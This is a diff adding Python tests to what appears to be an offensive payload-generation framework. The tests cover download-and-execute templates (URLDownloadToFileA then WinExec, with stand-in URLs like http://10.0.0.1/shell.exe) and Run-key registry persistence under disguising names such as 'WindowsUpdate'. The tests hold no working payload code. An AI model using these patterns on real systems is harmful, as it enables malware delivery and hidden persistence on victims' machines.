@@ -26,6 +26,9 @@ from emitrion.workflow.reference import (
     IRMoveFileTemplate,
     IRMoveThenRunTemplate,
     IRMoveToUserdirTemplate,
+    IRRegistryPersistenceTemplate,
+    IRUrlDownloadTemplate,
+    IRUrlDownloadToUserdirTemplate,
     WorkflowTemplate,
     build_bind_shell_workflow,
     build_check_path_workflow,
@@ -38,8 +41,11 @@ from emitrion.workflow.reference import (
     build_move_file_workflow,
     build_move_then_run_workflow,
     build_move_to_userdir_workflow,
+    build_registry_persistence_workflow,
     build_reverse_shell_workflow,
     build_run_command_workflow,
+    build_url_download_to_userdir_workflow,
+    build_url_download_workflow,
 )
 
 
@@ -1834,3 +1840,321 @@ class TestHttpDownloadToUserdirEndToEnd:
         assert result.contract_md
         assert "GetUserNameA" in result.contract_md
         assert "InternetOpenA" in result.contract_md
+
+
+# ---------------------------------------------------------------------------
+# URL download (single-call via URLDownloadToFileA)
+# ---------------------------------------------------------------------------
+
+
+class TestUrlDownloadWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_url_download_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_url_download_workflow()
+        names = {b.name for b in w.blocks}
+        assert "entry" in names
+        assert "run_payload" in names
+        assert "success" in names
+        assert "fail" in names
+
+    def test_workflow_with_custom_params(self):
+        from emitrion.workflow.validator import validate
+        w = build_url_download_workflow(
+            url="http://10.0.0.1/shell.exe",
+            dst_path=r"C:\temp\shell.exe",
+        )
+        result = validate(w)
+        assert result.valid, result.errors
+
+
+class TestUrlDownloadTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRUrlDownloadTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe", dst_path=r"C:\p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "URLDownloadToFileA" in slots
+        assert "LoadLibraryA" in slots
+        assert "WinExec" in slots
+
+    def test_probe_slots_finds_strings(self):
+        tmpl = IRUrlDownloadTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe", dst_path=r"C:\p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "urlmon_dll" in slots
+        assert "url" in slots
+        assert "dst_path" in slots
+
+    def test_cheatsheet(self):
+        tmpl = IRUrlDownloadTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe", dst_path=r"C:\p.exe")
+        sheet = tmpl.cheatsheet(config)
+        labels = [s[0] for s in sheet]
+        assert "Download URL" in labels
+        assert "Destination path" in labels
+
+
+class TestUrlDownloadLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        config = TemplateConfig(
+            url="http://192.168.1.10/payload.exe",
+            dst_path=r"C:\Users\Public\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "url_download.yaml"),
+            template_name="ir_url_download",
+            config=config,
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_run_payload:" in lowered_asm
+
+    def test_contains_url_download_call(self, lowered_asm):
+        assert "URLDownloadToFileA" in lowered_asm
+
+    def test_contains_loadlibrary(self, lowered_asm):
+        assert "LoadLibraryA" in lowered_asm
+
+    def test_contains_winexec(self, lowered_asm):
+        assert "WinExec" in lowered_asm
+
+
+class TestUrlDownloadEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path):
+        from emitrion.build import build
+        config = TemplateConfig(
+            url="http://192.168.1.10/payload.exe",
+            dst_path=r"C:\Users\Public\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "url_download.yaml"),
+            template_name="ir_url_download",
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "main:" in result.asm
+        assert result.contract_md
+        assert "URLDownloadToFileA" in result.contract_md
+
+
+# ---------------------------------------------------------------------------
+# URL download to user directory
+# ---------------------------------------------------------------------------
+
+
+class TestUrlDownloadToUserdirWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_url_download_to_userdir_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_url_download_to_userdir_workflow()
+        names = {b.name for b in w.blocks}
+        assert "entry" in names
+        assert "build_path" in names
+        assert "use_path" in names
+        assert "run_payload" in names
+
+
+class TestUrlDownloadToUserdirTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRUrlDownloadToUserdirTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "GetUserNameA" in slots
+        assert "lstrcpyA" in slots
+        assert "lstrcatA" in slots
+        assert "URLDownloadToFileA" in slots
+        assert "WinExec" in slots
+
+    def test_probe_slots_finds_structs(self):
+        tmpl = IRUrlDownloadToUserdirTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "username_buf" in slots
+        assert "dest_path_buf" in slots
+
+
+class TestUrlDownloadToUserdirLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        config = TemplateConfig(
+            url="http://192.168.1.10/payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "url_download_to_userdir.yaml"),
+            template_name="ir_url_download_to_userdir",
+            config=config,
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_getusername(self, lowered_asm):
+        assert "GetUserNameA" in lowered_asm
+
+    def test_contains_lstrcpy_lstrcata(self, lowered_asm):
+        assert "lstrcpyA" in lowered_asm
+        assert "lstrcatA" in lowered_asm
+
+    def test_contains_url_download(self, lowered_asm):
+        assert "URLDownloadToFileA" in lowered_asm
+
+    def test_contains_winexec(self, lowered_asm):
+        assert "WinExec" in lowered_asm
+
+
+class TestUrlDownloadToUserdirEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path):
+        from emitrion.build import build
+        config = TemplateConfig(
+            url="http://192.168.1.10/payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "url_download_to_userdir.yaml"),
+            template_name="ir_url_download_to_userdir",
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "main:" in result.asm
+        assert result.contract_md
+        assert "URLDownloadToFileA" in result.contract_md
+        assert "GetUserNameA" in result.contract_md
+
+
+# ---------------------------------------------------------------------------
+# Registry persistence (HKCU Run key)
+# ---------------------------------------------------------------------------
+
+
+class TestRegistryPersistenceWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_registry_persistence_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_registry_persistence_workflow()
+        names = {b.name for b in w.blocks}
+        assert "entry" in names
+        assert "set_value" in names
+        assert "success" in names
+        assert "fail" in names
+
+    def test_workflow_with_custom_params(self):
+        from emitrion.workflow.validator import validate
+        w = build_registry_persistence_workflow(
+            exe_path=r"C:\Windows\Temp\svc.exe",
+            reg_value_name="SvcHost",
+        )
+        result = validate(w)
+        assert result.valid, result.errors
+
+
+class TestRegistryPersistenceTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRRegistryPersistenceTemplate()
+        config = TemplateConfig(exe_path=r"C:\p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "RegOpenKeyExA" in slots
+        assert "RegSetValueExA" in slots
+        assert "RegCloseKey" in slots
+        assert "lstrlenA" in slots
+        assert "LoadLibraryA" in slots
+
+    def test_probe_slots_finds_strings(self):
+        tmpl = IRRegistryPersistenceTemplate()
+        config = TemplateConfig(exe_path=r"C:\p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "advapi_dll" in slots
+        assert "reg_key_path" in slots
+        assert "reg_value_name" in slots
+        assert "exe_path" in slots
+
+    def test_cheatsheet(self):
+        tmpl = IRRegistryPersistenceTemplate()
+        config = TemplateConfig(exe_path=r"C:\p.exe", reg_value_name="TestVal")
+        sheet = tmpl.cheatsheet(config)
+        labels = [s[0] for s in sheet]
+        assert "Registry hive" in labels
+        assert "Key path" in labels
+        assert "Value name" in labels
+
+
+class TestRegistryPersistenceLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        config = TemplateConfig(
+            exe_path=r"C:\Users\Public\payload.exe",
+            reg_value_name="WindowsUpdate",
+        )
+        result = build(
+            str(manifest_dir / "registry_persistence.yaml"),
+            template_name="ir_registry_persistence",
+            config=config,
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_set_value:" in lowered_asm
+
+    def test_contains_reg_apis(self, lowered_asm):
+        assert "RegOpenKeyExA" in lowered_asm
+        assert "RegSetValueExA" in lowered_asm
+        assert "RegCloseKey" in lowered_asm
+
+    def test_contains_lstrlen(self, lowered_asm):
+        assert "lstrlenA" in lowered_asm
+
+    def test_contains_loadlibrary(self, lowered_asm):
+        assert "LoadLibraryA" in lowered_asm
+
+    def test_contains_branching(self, lowered_asm):
+        assert "test eax, eax" in lowered_asm
+
+
+class TestRegistryPersistenceEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path):
+        from emitrion.build import build
+        config = TemplateConfig(
+            exe_path=r"C:\Users\Public\payload.exe",
+            reg_value_name="WindowsUpdate",
+        )
+        result = build(
+            str(manifest_dir / "registry_persistence.yaml"),
+            template_name="ir_registry_persistence",
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "main:" in result.asm
+        assert result.contract_md
+        assert "RegOpenKeyExA" in result.contract_md
+        assert "RegSetValueExA" in result.contract_md
